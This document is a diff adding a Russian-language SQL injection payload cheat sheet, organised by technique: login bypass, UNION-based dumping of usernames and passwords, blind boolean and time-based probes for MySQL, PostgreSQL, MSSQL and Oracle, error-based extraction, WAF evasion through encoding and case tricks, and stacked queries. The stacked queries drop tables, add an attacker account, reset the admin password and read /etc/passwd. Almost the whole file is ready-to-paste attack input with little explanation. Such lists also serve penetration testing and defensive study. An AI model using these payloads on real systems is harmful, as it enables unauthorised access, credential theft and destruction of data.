@@ -1,0 +1,196 @@
+Базовые bypass (логин без пароля)
+Одинарная кавычка (проверка уязвимости)
+'
+
+Всегда TRUE (классика)
+' OR 1=1 --
+
+С комментарием #
+' OR 1=1 #
+
+С обходом логина и пароля
+admin' OR '1'='1
+
+Закрытие кавычки + TRUE
+' OR '1'='1' --
+🔎 UNION-based (добыча данных)
+Проверка количества колонок
+' ORDER BY 1 --
+' ORDER BY 2 --
+' ORDER BY 3 --
+
+UNION SELECT (поиск рабочих колонок)
+' UNION SELECT NULL,NULL,NULL --
+
+Получение версии БД
+' UNION SELECT NULL,version(),NULL --
+
+Получение текущей БД
+' UNION SELECT NULL,database(),NULL --
+
+Получение пользователя
+' UNION SELECT NULL,user(),NULL --
+📂 Извлечение таблиц и данных
+Список таблиц (MySQL)
+' UNION SELECT NULL,table_name,NULL FROM information_schema.tables --
+
+Список колонок
+' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users' --
+
+Получение логинов и паролей
+' UNION SELECT NULL,username,password FROM users --
+🧠 Boolean-based (слепая инъекция)
+TRUE / FALSE проверка
+' AND 1=1 --
+' AND 1=2 --
+
+Проверка длины строки
+' AND LENGTH(database())=5 --
+
+Проверка символа
+' AND SUBSTRING(database(),1,1)='a' --
+⏱️ Time-based (если нет ответа)
+Задержка (MySQL)
+' OR SLEEP(5) --
+
+Условная задержка
+' AND IF(1=1,SLEEP(5),0) --
+
+Проверка символа через задержку
+' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0) --
+🧨 Error-based
+Вызов ошибки с данными
+' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e)) --
+
+Через updatexml
+' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1) --
+
+Базовые вариации bypass
+Классика TRUE
+' OR 1=1 --
+" OR 1=1 --
+
+С дополнительным условием
+' OR 'a'='a' --
+' OR 2>1 --
+
+Через LIKE
+' OR 'a' LIKE 'a' --
+
+Через NOT
+' OR NOT 1=2 --
+
+С NULL
+' OR NULL IS NULL --
+
+С BETWEEN
+' OR 1 BETWEEN 1 AND 2 --
+🔄 Обход фильтров (WAF bypass)
+Разные комментарии
+'/**/OR/**/1=1--
+' OR 1=1/*
+
+Смешанный регистр
+' oR 1=1 --
+' UnIoN SeLeCt
+
+Без пробелов
+'OR(1=1)--
+
+Через табы / переносы
+' OR%0a1=1 --
+
+URL encoding
+%27%20OR%201%3D1%20--
+
+Двойное кодирование
+%2527%2520OR%25201%253D1--
+
+Через CONCAT
+' OR CONCAT('a','a')='aa' --
+🔎 Продвинутый UNION
+Определение колонок через NULL
+' UNION SELECT NULL --
+' UNION SELECT NULL,NULL --
+' UNION SELECT NULL,NULL,NULL,NULL --
+
+Через числа
+' UNION SELECT 1,2,3 --
+
+С выводом строк
+' UNION SELECT 1,'test',3 --
+
+Комбинированный
+' UNION ALL SELECT username,password FROM users --
+📂 Работа с information_schema (глубже)
+Список баз данных
+' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata --
+
+Список таблиц конкретной БД
+' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='testdb' --
+
+Список колонок
+' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users' --
+
+Фильтрация
+' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_name LIKE '%user%' --
+🧠 Boolean-based (больше вариантов)
+С ASCII
+' AND ASCII(SUBSTRING(database(),1,1))=97 --
+
+Перебор символов
+' AND ASCII(SUBSTRING(database(),1,1))>100 --
+
+Через EXISTS
+' AND EXISTS(SELECT * FROM users) --
+
+Через IN
+' AND 1 IN (SELECT 1) --
+
+Через COUNT
+' AND (SELECT COUNT(*) FROM users)>0 --
+⏱️ Time-based (разные СУБД)
+MySQL
+' OR SLEEP(5) --
+' AND IF(1=1,SLEEP(5),0) --
+
+PostgreSQL
+' OR pg_sleep(5) --
+
+MSSQL
+'; WAITFOR DELAY '0:0:5' --
+
+Oracle
+' AND dbms_pipe.receive_message(('a'),5) --
+🧨 Error-based (расширенные)
+MySQL
+' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e)) --
+' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) --
+
+Через RAND()
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a) --
+
+Деление на 0
+' AND 1=1/0 --
+📦 Stacked queries (если разрешены)
+Вторая команда
+'; DROP TABLE users --
+
+Добавление пользователя
+'; INSERT INTO users(username,password) VALUES('hacker','123') --
+
+Обновление
+'; UPDATE users SET password='123' WHERE username='admin' --
+
+Чтение файлов (MySQL)
+'; SELECT LOAD_FILE('/etc/passwd') --
+🗂️ Аутентификация (реальные формы)
+Обход login/password
+admin' --
+admin' #
+
+' OR username='admin' --
+
+' OR username='admin' AND password LIKE '%' --
+
+' OR ''='
